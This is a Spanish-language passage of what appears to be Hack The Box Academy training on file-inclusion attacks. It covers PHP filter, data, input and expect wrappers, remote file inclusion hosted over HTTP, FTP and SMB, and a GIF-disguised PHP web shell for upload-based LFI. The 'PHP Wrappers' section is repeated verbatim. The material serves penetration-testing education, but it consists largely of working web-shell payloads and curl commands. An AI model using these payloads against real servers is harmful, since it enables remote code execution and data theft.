**Nota:** Dejamos intencionalmente el archivo de recursos al final de nuestra cadena, como el `.php` la extensión se agrega automáticamente al final de nuestra cadena de entrada, lo que haría que el recurso que especificamos sea `config.php`.

Como podemos ver, a diferencia de nuestro intento con LFI regular, el uso del filtro base64 devolvió una cadena codificada en lugar del resultado vacío que vimos anteriormente. Ahora podemos decodificar esta cadena para obtener el contenido del código fuente de `config.php`, como sigue:

  Filtros PHP

```shell-session
vcrdcr@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

...SNIP...

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

...SNIP...
```

**Consejo:** Al copiar la cadena codificada base64, asegúrese de copiar toda la cadena o no se decodificará por completo. Puede ver la fuente de la página para asegurarse de copiar toda la cadena.

Ahora podemos investigar este archivo en busca de información confidencial como credenciales o claves de base de datos y comenzar a identificar más referencias y luego divulgar sus fuentes.


# PHP Wrappers

Hasta ahora, en este módulo, hemos estado explotando vulnerabilidades de inclusión de archivos para divulgar archivos locales a través de varios métodos. A partir de esta sección, comenzaremos a aprender cómo podemos usar vulnerabilidades de inclusión de archivos para ejecutar código en los servidores de back-end y obtener control sobre ellos.

Podemos usar muchos métodos para ejecutar comandos remotos, cada uno de los cuales tiene un caso de uso específico, ya que dependen del lenguaje/marco de back-end y las capacidades de la función vulnerable. Un método fácil y común para obtener control sobre el servidor de back-end es enumerar las credenciales de usuario y las claves SSH, y luego usarlas para iniciar sesión en el servidor de back-end a través de SSH o cualquier otra sesión remota. Por ejemplo, podemos encontrar la contraseña de la base de datos en un archivo como `config.php`, que puede coincidir con la contraseña de un usuario en caso de que reutilice la misma contraseña. O podemos comprobar el `.ssh` directorio en el directorio de inicio de cada usuario, y si los privilegios de lectura no están configurados correctamente, entonces podemos obtener su clave privada (`id_rsa`) y úselo a SSH en el sistema.

Aparte de tales métodos triviales, hay formas de lograr la ejecución remota de código directamente a través de la función vulnerable sin depender de la enumeración de datos o privilegios de archivo locales. En esta sección, comenzaremos con la ejecución remota de código en aplicaciones web PHP. Construiremos sobre lo que aprendimos en la sección anterior, y utilizaremos diferentes `PHP Wrappers` para obtener la ejecución remota de código. Luego, en las próximas secciones, aprenderemos otros métodos para obtener la ejecución remota de código que también se puede usar con PHP y otros lenguajes.

---

## Datos

El [datos](https://www.php.net/manual/en/wrappers.data.php) wrapper se puede utilizar para incluir datos externos, incluido el código PHP. Sin embargo, el envoltorio de datos solo está disponible para usar si el (`allow_url_include`) la configuración está habilitada en las configuraciones de PHP. Entonces, primero confirmemos si esta configuración está habilitada, leyendo el archivo de configuración de PHP a través de la vulnerabilidad LFI.

#### Comprobación de configuraciones PHP

Para hacerlo, podemos incluir el archivo de configuración de PHP que se encuentra en (`/etc/php/X.Y/apache2/php.ini`) para Apache o en (`/etc/php/X.Y/fpm/php.ini`) para Nginx, donde `X.Y` es su versión de instalación de PHP. Podemos comenzar con la última versión de PHP y probar versiones anteriores si no pudimos localizar el archivo de configuración. También usaremos el `base64` filtro que utilizamos en la sección anterior, como `.ini` los archivos son similares a `.php` archivos y deben ser codificados para evitar romperse. Finalmente, usaremos cURL o Burp en lugar de un navegador, ya que la cadena de salida podría ser muy larga y deberíamos poder capturarla correctamente:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

Una vez que tengamos la cadena codificada base64, podemos decodificarla y `grep` para `allow_url_include` para ver su valor:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

¡Excelente! Vemos que tenemos esta opción habilitada, por lo que podemos usar el `data` envoltura. Saber cómo verificar el `allow_url_include` la opción puede ser muy importante, como `this option is not enabled by default`, y se requiere para varios otros ataques LFI, como usar el `input` envoltura o para cualquier ataque RFI, como veremos a continuación. No es raro ver esta opción habilitada, ya que muchas aplicaciones web dependen de ella para funcionar correctamente, como algunos complementos y temas de WordPress, por ejemplo.

#### Ejecución Remota de Código

Con `allow_url_include` habilitado, podemos proceder con nuestro `data` ataque de envoltura. Como se mencionó anteriormente, el `data` wrapper se puede utilizar para incluir datos externos, incluido el código PHP. También podemos pasarlo `base64` cadenas codificadas con `text/plain;base64`, y tiene la capacidad de decodificarlos y ejecutar el código PHP.

Entonces, nuestro primer paso sería basar64 codificar un shell web PHP básico, de la siguiente manera:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Ahora, podemos codificar URL la cadena base64 y luego pasarla al contenedor de datos con `data://text/plain;base64,`. Finalmente, podemos usar comandos de pase al shell web con `&cmd=<COMMAND>`:

   

![](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)

También podemos usar cURL para el mismo ataque, de la siguiente manera:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Entrada

Similar a la `data` envoltura, el [entrada](https://www.php.net/manual/en/wrappers.php.php) wrapper se puede utilizar para incluir entrada externa y ejecutar código PHP. La diferencia entre él y el `data` wrapper es que pasamos nuestra entrada a la `input` wrapper como datos de una solicitud POST. Por lo tanto, el parámetro vulnerable debe aceptar solicitudes POST para que este ataque funcione. Finalmente, el `input` la envoltura también depende de la `allow_url_include` configuración, como se mencionó anteriormente.

Para repetir nuestro ataque anterior pero con el `input` wrapper, podemos enviar una solicitud POST a la URL vulnerable y agregar nuestro shell web como datos POST. Para ejecutar un comando, lo pasaríamos como un parámetro GET, como lo hicimos en nuestro ataque anterior:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Nota:** Para pasar nuestro comando como una solicitud GET, necesitamos la función vulnerable para aceptar también la solicitud GET (es decir, el uso `$_REQUEST`). Si solo acepta solicitudes POST, entonces podemos poner nuestro comando directamente en nuestro código PHP, en lugar de un shell web dinámico (por ejemplo. `<\?php system('id')?>`)

---

## Esperar

Finalmente, podemos utilizar el [esperar](https://www.php.net/manual/en/wrappers.expect.php) wrapper, que nos permite ejecutar comandos directamente a través de flujos de URL. Expect funciona de manera muy similar a los shells web que hemos utilizado anteriormente, pero no es necesario proporcionar un shell web, ya que está diseñado para ejecutar comandos.

Sin embargo, expect es un envoltorio externo, por lo que debe instalarse y habilitarse manualmente en el servidor de back-end, aunque algunas aplicaciones web dependen de él para su funcionalidad principal, por lo que podemos encontrarlo en casos específicos. Podemos determinar si está instalado en el servidor de back-end como lo hicimos con `allow_url_include` antes, pero lo haríamos `grep` para `expect` en cambio, y si está instalado y habilitado, obtendríamos lo siguiente:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

Como podemos ver, el `extension` la palabra clave de configuración se utiliza para habilitar el `expect` módulo, lo que significa que deberíamos poder usarlo para obtener RCE a través de la vulnerabilidad LFI. Para usar el módulo expect, podemos usar el `expect://` envolver y luego pasar el comando que queremos ejecutar, de la siguiente manera:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como podemos ver, ejecutando comandos a través del `expect` el módulo es bastante sencillo, ya que este módulo fue diseñado para la ejecución de comandos, como se mencionó anteriormente. El [Ataques Web](https://academy.hackthebox.com/module/details/134) el módulo también cubre el uso de `expect` módulo con vulnerabilidades XXE, por lo que si tiene una buena comprensión de cómo usarlo aquí, debe configurarlo para usarlo con XXE.

Estos son los tres envoltorios PHP más comunes para ejecutar directamente comandos del sistema a través de vulnerabilidades LFI. También cubriremos el `phar` y `zip` envoltorios en las próximas secciones, que podemos usar con aplicaciones web que permiten la carga de archivos para obtener la ejecución remota a través de vulnerabilidades LFI.

# PHP Wrappers

Hasta ahora, en este módulo, hemos estado explotando vulnerabilidades de inclusión de archivos para divulgar archivos locales a través de varios métodos. A partir de esta sección, comenzaremos a aprender cómo podemos usar vulnerabilidades de inclusión de archivos para ejecutar código en los servidores de back-end y obtener control sobre ellos.

Podemos usar muchos métodos para ejecutar comandos remotos, cada uno de los cuales tiene un caso de uso específico, ya que dependen del lenguaje/marco de back-end y las capacidades de la función vulnerable. Un método fácil y común para obtener control sobre el servidor de back-end es enumerar las credenciales de usuario y las claves SSH, y luego usarlas para iniciar sesión en el servidor de back-end a través de SSH o cualquier otra sesión remota. Por ejemplo, podemos encontrar la contraseña de la base de datos en un archivo como `config.php`, que puede coincidir con la contraseña de un usuario en caso de que reutilice la misma contraseña. O podemos comprobar el `.ssh` directorio en el directorio de inicio de cada usuario, y si los privilegios de lectura no están configurados correctamente, entonces podemos obtener su clave privada (`id_rsa`) y úselo a SSH en el sistema.

Aparte de tales métodos triviales, hay formas de lograr la ejecución remota de código directamente a través de la función vulnerable sin depender de la enumeración de datos o privilegios de archivo locales. En esta sección, comenzaremos con la ejecución remota de código en aplicaciones web PHP. Construiremos sobre lo que aprendimos en la sección anterior, y utilizaremos diferentes `PHP Wrappers` para obtener la ejecución remota de código. Luego, en las próximas secciones, aprenderemos otros métodos para obtener la ejecución remota de código que también se puede usar con PHP y otros lenguajes.

---

## Datos

El [datos](https://www.php.net/manual/en/wrappers.data.php) wrapper se puede utilizar para incluir datos externos, incluido el código PHP. Sin embargo, el envoltorio de datos solo está disponible para usar si el (`allow_url_include`) la configuración está habilitada en las configuraciones de PHP. Entonces, primero confirmemos si esta configuración está habilitada, leyendo el archivo de configuración de PHP a través de la vulnerabilidad LFI.

#### Comprobación de configuraciones PHP

Para hacerlo, podemos incluir el archivo de configuración de PHP que se encuentra en (`/etc/php/X.Y/apache2/php.ini`) para Apache o en (`/etc/php/X.Y/fpm/php.ini`) para Nginx, donde `X.Y` es su versión de instalación de PHP. Podemos comenzar con la última versión de PHP y probar versiones anteriores si no pudimos localizar el archivo de configuración. También usaremos el `base64` filtro que utilizamos en la sección anterior, como `.ini` los archivos son similares a `.php` archivos y deben ser codificados para evitar romperse. Finalmente, usaremos cURL o Burp en lugar de un navegador, ya que la cadena de salida podría ser muy larga y deberíamos poder capturarla correctamente:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

Una vez que tengamos la cadena codificada base64, podemos decodificarla y `grep` para `allow_url_include` para ver su valor:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

¡Excelente! Vemos que tenemos esta opción habilitada, por lo que podemos usar el `data` envoltura. Saber cómo verificar el `allow_url_include` la opción puede ser muy importante, como `this option is not enabled by default`, y se requiere para varios otros ataques LFI, como usar el `input` envoltura o para cualquier ataque RFI, como veremos a continuación. No es raro ver esta opción habilitada, ya que muchas aplicaciones web dependen de ella para funcionar correctamente, como algunos complementos y temas de WordPress, por ejemplo.

#### Ejecución Remota de Código

Con `allow_url_include` habilitado, podemos proceder con nuestro `data` ataque de envoltura. Como se mencionó anteriormente, el `data` wrapper se puede utilizar para incluir datos externos, incluido el código PHP. También podemos pasarlo `base64` cadenas codificadas con `text/plain;base64`, y tiene la capacidad de decodificarlos y ejecutar el código PHP.

Entonces, nuestro primer paso sería basar64 codificar un shell web PHP básico, de la siguiente manera:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Ahora, podemos codificar URL la cadena base64 y luego pasarla al contenedor de datos con `data://text/plain;base64,`. Finalmente, podemos usar comandos de pase al shell web con `&cmd=<COMMAND>`:

   

![](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)

También podemos usar cURL para el mismo ataque, de la siguiente manera:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Entrada

Similar a la `data` envoltura, el [entrada](https://www.php.net/manual/en/wrappers.php.php) wrapper se puede utilizar para incluir entrada externa y ejecutar código PHP. La diferencia entre él y el `data` wrapper es que pasamos nuestra entrada a la `input` wrapper como datos de una solicitud POST. Por lo tanto, el parámetro vulnerable debe aceptar solicitudes POST para que este ataque funcione. Finalmente, el `input` la envoltura también depende de la `allow_url_include` configuración, como se mencionó anteriormente.

Para repetir nuestro ataque anterior pero con el `input` wrapper, podemos enviar una solicitud POST a la URL vulnerable y agregar nuestro shell web como datos POST. Para ejecutar un comando, lo pasaríamos como un parámetro GET, como lo hicimos en nuestro ataque anterior:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Nota:** Para pasar nuestro comando como una solicitud GET, necesitamos la función vulnerable para aceptar también la solicitud GET (es decir, el uso `$_REQUEST`). Si solo acepta solicitudes POST, entonces podemos poner nuestro comando directamente en nuestro código PHP, en lugar de un shell web dinámico (por ejemplo. `<\?php system('id')?>`)

---

## Esperar

Finalmente, podemos utilizar el [esperar](https://www.php.net/manual/en/wrappers.expect.php) wrapper, que nos permite ejecutar comandos directamente a través de flujos de URL. Expect funciona de manera muy similar a los shells web que hemos utilizado anteriormente, pero no es necesario proporcionar un shell web, ya que está diseñado para ejecutar comandos.

Sin embargo, expect es un envoltorio externo, por lo que debe instalarse y habilitarse manualmente en el servidor de back-end, aunque algunas aplicaciones web dependen de él para su funcionalidad principal, por lo que podemos encontrarlo en casos específicos. Podemos determinar si está instalado en el servidor de back-end como lo hicimos con `allow_url_include` antes, pero lo haríamos `grep` para `expect` en cambio, y si está instalado y habilitado, obtendríamos lo siguiente:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

Como podemos ver, el `extension` la palabra clave de configuración se utiliza para habilitar el `expect` módulo, lo que significa que deberíamos poder usarlo para obtener RCE a través de la vulnerabilidad LFI. Para usar el módulo expect, podemos usar el `expect://` envolver y luego pasar el comando que queremos ejecutar, de la siguiente manera:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como podemos ver, ejecutando comandos a través del `expect` el módulo es bastante sencillo, ya que este módulo fue diseñado para la ejecución de comandos, como se mencionó anteriormente. El [Ataques Web](https://academy.hackthebox.com/module/details/134) el módulo también cubre el uso de `expect` módulo con vulnerabilidades XXE, por lo que si tiene una buena comprensión de cómo usarlo aquí, debe configurarlo para usarlo con XXE.

Estos son los tres envoltorios PHP más comunes para ejecutar directamente comandos del sistema a través de vulnerabilidades LFI. También cubriremos el `phar` y `zip` envoltorios en las próximas secciones, que podemos usar con aplicaciones web que permiten la carga de archivos para obtener la ejecución remota a través de vulnerabilidades LFI.

# Remote File Inclusion (RFI)

Hasta ahora en este módulo, nos hemos centrado principalmente en `Local File Inclusion (LFI)`. Sin embargo, en algunos casos, también podemos incluir archivos remotos "[Inclusión Remota de Archivos (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)", si la función vulnerable permite la inclusión de URL remotas. Esto permite dos beneficios principales:

1. Enumerar puertos y aplicaciones web solo locales (es decir. SSRF)
2. Obtener la ejecución remota de código mediante la inclusión de un script malicioso que alojamos

En esta sección, cubriremos cómo obtener la ejecución remota de código a través de vulnerabilidades RFI. El [Ataques del lado del servidor](https://academy.hackthebox.com/module/details/145) el módulo cubre varios `SSRF` técnicas, que también se pueden utilizar con vulnerabilidades RFI.

## Inclusión de Archivos Locales vs. Remotos

Cuando una función vulnerable nos permite incluir archivos remotos, es posible que podamos alojar un script malicioso y luego incluirlo en la página vulnerable para ejecutar funciones maliciosas y obtener la ejecución remota de código. Si nos referimos a la tabla de la primera sección, vemos que las siguientes son algunas de las funciones que (si son vulnerables) permitirían RFI:

|**Función**|**Leer Contenido**|**Ejecutar**|**URL remota**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NETO**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|

Como podemos ver, casi cualquier vulnerabilidad RFI también es una vulnerabilidad LFI, ya que cualquier función que permita incluir URL remotas generalmente también permite incluir las locales. Sin embargo, un LFI puede no ser necesariamente un RFI. Esto se debe principalmente a tres razones:

1. La función vulnerable puede no permitir incluir URL remotas
2. Solo puede controlar una parte del nombre del archivo y no toda la envoltura del protocolo (ej: `http://`, `ftp://`, `https://`).
3. La configuración puede evitar RFI por completo, ya que la mayoría de los servidores web modernos deshabilitan la inclusión de archivos remotos de forma predeterminada.

Además, como podemos observar en la tabla anterior, algunas funciones permiten incluir URL remotas pero no permiten la ejecución de código. En este caso, aún podríamos explotar la vulnerabilidad para enumerar puertos locales y aplicaciones web a través de SSRF.

## Verificar RFI

En la mayoría de los idiomas, incluidas las URL remotas se considera una práctica peligrosa, ya que puede permitir tales vulnerabilidades. Esta es la razón por la cual la inclusión remota de URL generalmente está deshabilitada de forma predeterminada. Por ejemplo, cualquier inclusión remota de URL en PHP requeriría el `allow_url_include` configuración a habilitar. Podemos comprobar si esta configuración está habilitada a través de LFI, como hicimos en el apartado anterior:

  Inclusión Remota de Archivos (RFI)

```shell-session
vcrdcr@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

Sin embargo, esto puede no ser siempre confiable, ya que incluso si esta configuración está habilitada, la función vulnerable puede no permitir la inclusión remota de URL para empezar. Por lo tanto, una forma más confiable de determinar si una vulnerabilidad LFI también es vulnerable a RFI es `try and include a URL`y ver si podemos obtener su contenido. Al principio, `we should always start by trying to include a local URL` para garantizar que nuestro intento no sea bloqueado por un firewall u otras medidas de seguridad. Entonces, usemos (`http://127.0.0.1:80/index.php`) como nuestra cadena de entrada y ver si se incluye:

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_local_url_include.jpg)

Como podemos ver, el `index.php` la página se incluyó en la sección vulnerable (es decir. Historial Descripción), por lo que la página es realmente vulnerable a RFI, ya que podemos incluir URL. Además, el `index.php` la página no se incluyó como texto de código fuente, sino que se ejecutó y se representó como PHP, por lo que la función vulnerable también permite la ejecución de PHP, lo que puede permitirnos ejecutar código si incluimos un script PHP malicioso que alojamos en nuestra máquina.

También vemos que pudimos especificar el puerto `80` y obtenga la aplicación web en ese puerto. Si el servidor de back-end alojaba otras aplicaciones web locales (por ejemplo, puerto `8080`), entonces podemos acceder a ellos a través de la vulnerabilidad RFI aplicando técnicas SSRF en él.

**Nota:** Puede que no sea ideal incluir la página vulnerable en sí (es decir, index.php), ya que esto puede causar un bucle de inclusión recursiva y causar un DoS al servidor de back-end.

## Ejecución Remota de Código con RFI

El primer paso para obtener la ejecución remota de código es crear un script malicioso en el lenguaje de la aplicación web, PHP en este caso. Podemos usar un shell web personalizado que descargamos de internet, usar un script de shell inverso, o escribir nuestro propio shell web básico como hicimos en el apartado anterior, que es lo que haremos en este caso:

  Inclusión Remota de Archivos (RFI)

```shell-session
vcrdcr@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Ahora, todo lo que necesitamos hacer es alojar este script e incluirlo a través de la vulnerabilidad RFI. Es una buena idea escuchar en un puerto HTTP común como `80` o `443`, ya que estos puertos pueden estar en la lista blanca en caso de que la aplicación web vulnerable tenga un firewall que impida las conexiones salientes. Además, podemos alojar el script a través de un servicio FTP o un servicio SMB, como veremos a continuación.

## HTTP

Ahora, podemos iniciar un servidor en nuestra máquina con un servidor python básico con el siguiente comando, como sigue:

  Inclusión Remota de Archivos (RFI)

```shell-session
vcrdcr@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

Ahora, podemos incluir nuestro shell local a través de RFI, como lo hicimos antes, pero usando `<OUR_IP>` y nuestro `<LISTENING_PORT>`. También especificaremos el comando con el que se ejecutará `&cmd=id`:

   

![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

Como podemos ver, obtuvimos una conexión en nuestro servidor python, y se incluyó el shell remoto, y ejecutamos el comando especificado:

  Inclusión Remota de Archivos (RFI)

```shell-session
vcrdcr@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...

SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
```

**Consejo:** Podemos examinar la conexión en nuestra máquina para asegurarnos de que la solicitud se envía tal como la especificamos. Por ejemplo, si vimos una extensión adicional (.php) que se adjuntó a la solicitud, entonces podemos omitirla de nuestra carga útil

## FTP

Como se mencionó anteriormente, también podemos alojar nuestro script a través del protocolo FTP. Podemos iniciar un servidor FTP básico con Python `pyftpdlib`, como sigue:

  Inclusión Remota de Archivos (RFI)

```shell-session
vcrdcr@htb[/htb]$ sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

Esto también puede ser útil en caso de que los puertos http estén bloqueados por un firewall o el `http://` la cadena es bloqueada por un WAF. Para incluir nuestro script, podemos repetir lo que hicimos antes, pero usar el `ftp://` esquema en la URL, de la siguiente manera:

   

![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

Como podemos ver, esto funcionó de manera muy similar a nuestro ataque http, y el comando fue ejecutado. De forma predeterminada, PHP intenta autenticarse como un usuario anónimo. Si el servidor requiere autenticación válida, las credenciales se pueden especificar en la URL, de la siguiente manera:

  Inclusión Remota de Archivos (RFI)

```shell-session
vcrdcr@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## SMB

Si la aplicación web vulnerable está alojada en un servidor Windows (lo que podemos decir de la versión del servidor en los encabezados de respuesta HTTP), entonces no necesitamos `allow_url_include` configuración que se habilitará para la explotación de RFI, ya que podemos utilizar el protocolo SMB para la inclusión remota de archivos. Esto se debe a que Windows trata los archivos en servidores SMB remotos como archivos normales, a los que se puede hacer referencia directamente con una ruta UNC.

Podemos hacer girar un servidor SMB usando `Impacket's smbserver.py`, que permite la autenticación anónima por defecto, de la siguiente manera:

  Inclusión Remota de Archivos (RFI)

```shell-session
vcrdcr@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Ahora, podemos incluir nuestro script usando una ruta UNC (por ejemplo. `\\<OUR_IP>\share\shell.php`), y especifique el comando con (`&cmd=whoami`) como hicimos antes:

   

![](https://academy.hackthebox.com/storage/modules/23/windows_rfi.png)

Como podemos ver, este ataque funciona al incluir nuestro script remoto, y no necesitamos que se habilite ninguna configuración no predeterminada. Sin embargo, debemos tener en cuenta que esta técnica es `more likely to work if we were on the same network`, ya que el acceso a servidores SMB remotos a través de Internet puede deshabilitarse de forma predeterminada, dependiendo de las configuraciones del servidor de Windows.

# LFI and File Uploads

Las funcionalidades de carga de archivos son omnipresentes en la mayoría de las aplicaciones web modernas, ya que los usuarios generalmente necesitan configurar su perfil y uso de la aplicación web cargando sus datos. Para los atacantes, la capacidad de almacenar archivos en el servidor de back-end puede extender la explotación de muchas vulnerabilidades, como una vulnerabilidad de inclusión de archivos.

El [Ataques de Carga de Archivos](https://academy.hackthebox.com/module/details/136) el módulo cubre diferentes técnicas sobre cómo explotar formularios y funcionalidades de carga de archivos. Sin embargo, para el ataque que vamos a discutir en esta sección, no requerimos que el formulario de carga de archivos sea vulnerable, sino que simplemente nos permite cargar archivos. Si la función vulnerable tiene código `Execute` capacidades, entonces el código dentro del archivo que cargamos se ejecutará si lo incluimos, independientemente de la extensión del archivo o el tipo de archivo. Por ejemplo, podemos cargar un archivo de imagen (por ejemplo. `image.jpg`), y almacenar un código de shell web PHP dentro de él 'en lugar de datos de imagen', y si lo incluimos a través de la vulnerabilidad LFI, el código PHP se ejecutará y tendremos la ejecución remota de código.

Como se mencionó en la primera sección, las siguientes son las funciones que permiten ejecutar código con inclusión de archivos, cualquiera de los cuales funcionaría con los ataques de esta sección:

|**Función**|**Leer Contenido**|**Ejecutar**|**URL remota**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodoJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NETO**||||
|`include`|✅|✅|✅|

---

## Carga de imágenes

La carga de imágenes es muy común en la mayoría de las aplicaciones web modernas, ya que la carga de imágenes se considera ampliamente segura si la función de carga está codificada de forma segura. Sin embargo, como se discutió anteriormente, la vulnerabilidad, en este caso, no está en el formulario de carga de archivos, sino en la funcionalidad de inclusión de archivos.

#### Elaboración de Imagen Maliciosa

Nuestro primer paso es crear una imagen maliciosa que contenga un código de shell web PHP que aún se vea y funcione como una imagen. Por lo tanto, utilizaremos una extensión de imagen permitida en nuestro nombre de archivo (por ejemplo. `shell.gif`), y también debe incluir los bytes mágicos de la imagen al comienzo del contenido del archivo (por ejemplo. `GIF8`), en caso de que el formulario de carga también verifique tanto la extensión como el tipo de contenido. Podemos hacerlo de la siguiente manera:

  LFI y Cargas de Archivos

```shell-session
vcrdcr@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Este archivo por sí solo es completamente inofensivo y no afectaría a las aplicaciones web normales en lo más mínimo. Sin embargo, si lo combinamos con una vulnerabilidad LFI, es posible que podamos alcanzar la ejecución remota de código.

**Nota:** Estamos usando un `GIF` imagen en este caso ya que sus bytes mágicos se escriben fácilmente, ya que son caracteres ASCII, mientras que otras extensiones tienen bytes mágicos en binario que necesitaríamos para codificar URL. Sin embargo, este ataque funcionaría con cualquier imagen o tipo de archivo permitido. El [Ataques de Carga de Archivos](https://academy.hackthebox.com/module/details/136) el módulo profundiza más para los ataques de tipo de archivo, y la misma lógica se puede aplicar aquí.

Ahora, necesitamos cargar nuestro archivo de imagen malicioso. Para hacerlo, podemos ir al `Profile Settings` página y haga clic en la imagen del avatar para seleccionar nuestra imagen, y luego haga clic en cargar y nuestra imagen debe cargarse correctamente:

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_upload_gif.jpg)

#### Ruta de Archivo Subida

Una vez que hayamos subido nuestro archivo, todo lo que tenemos que hacer es incluirlo a través de la vulnerabilidad LFI. Para incluir el archivo cargado, necesitamos conocer la ruta a nuestro archivo cargado. En la mayoría de los casos, especialmente con las imágenes, tendríamos acceso a nuestro archivo cargado y podemos obtener su ruta desde su URL. En nuestro caso, si inspeccionamos el código fuente después de cargar la imagen, podemos obtener su URL:

Código: html

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

